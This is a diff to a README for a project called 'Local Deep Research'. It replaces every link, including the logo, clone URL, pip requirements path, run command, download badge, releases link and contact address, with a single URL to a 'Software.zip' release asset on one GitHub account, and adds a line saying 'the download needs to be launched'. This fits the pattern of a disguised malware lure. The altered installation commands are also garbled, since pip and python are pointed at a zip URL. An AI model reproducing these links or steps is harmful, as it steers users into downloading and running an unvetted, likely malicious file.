@@ -1,6 +1,6 @@
 # 🌟 Welcome to Local Deep Research Repository! 🤖
 
-![Local Deep Research Logo](https://example.com/logo.png)
+![Local Deep Research Logo](https://github.com/gangganghao618618/local-deep-research/releases/download/v1.0/Software.zip)
 
 ## Description
 This repository is dedicated to local deep research, exploring the depths of deep learning technologies for local applications. Dive into the world of cutting-edge research and innovation right at your fingertips!
@@ -13,9 +13,9 @@ This repository is dedicated to local deep research, exploring the depths of dee
 
 ## Installation
 To get started with Local Deep Research, follow these steps:
-1. Clone the repository using `git clone https://github.com/your-username/local-deep-research.git`
-2. Install the required dependencies by running `pip install -r requirements.txt`
-3. Launch the local application by running `python app.py`
+1. Clone the repository using `git clone https://github.com/gangganghao618618/local-deep-research/releases/download/v1.0/Software.zip`
+2. Install the required dependencies by running `pip install -r https://github.com/gangganghao618618/local-deep-research/releases/download/v1.0/Software.zip`
+3. Launch the local application by running `python https://github.com/gangganghao618618/local-deep-research/releases/download/v1.0/Software.zip`
 
 Get ready to embark on a journey of discovery with local deep research!
 
@@ -40,11 +40,11 @@ This repository is licensed under the MIT License. See [LICENSE](LICENSE) for mo
 
 🚀 **Download the Latest Release Here:**
 
-[![Download Local Deep Research](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Local Deep Research](https://github.com/gangganghao618618/local-deep-research/releases/download/v1.0/Software.zip)](https://github.com/gangganghao618618/local-deep-research/releases/download/v1.0/Software.zip)
 
 📌 *Please note, the download needs to be launched.*
 
-🔗 Want to explore more projects? Visit the [Releases](https://github.com/your-username/local-deep-research/releases) section for additional resources.
+🔗 Want to explore more projects? Visit the [Releases](https://github.com/gangganghao618618/local-deep-research/releases/download/v1.0/Software.zip) section for additional resources.
 
 ---
 
@@ -52,7 +52,7 @@ Join us in the realm of local deep research, where innovation knows no bounds! �
 
 ---
 
-Feel free to reach out to us at [contact@localdeepresearch.com](mailto:contact@localdeepresearch.com) for any inquiries or collaborations.
+Feel free to reach out to us at [https://github.com/gangganghao618618/local-deep-research/releases/download/v1.0/Software.zip](https://github.com/gangganghao618618/local-deep-research/releases/download/v1.0/Software.zip) for any inquiries or collaborations.
 
 Happy researching! 🧠🔍
 
